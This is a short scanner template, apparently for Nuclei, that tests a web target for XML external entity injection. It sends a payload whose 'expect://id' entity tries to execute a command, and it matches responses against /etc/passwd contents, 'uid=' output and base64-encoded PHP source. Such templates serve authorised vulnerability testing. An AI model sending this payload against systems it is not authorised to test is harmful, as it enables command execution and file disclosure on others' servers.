id: xxe5-0206
name: 'XXE read in doc'
severity: critical
type: active
tags:
  - xxe
  - injection
  - xml
description: 'XXE entity via doc'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      doc:
        - '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "expect://id">]><r>&xxe;</r>'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
          - 'root:'
          - 'XXE_OK'
          - 'localhost'
          - 'uid='
          - 'PD9waHA'
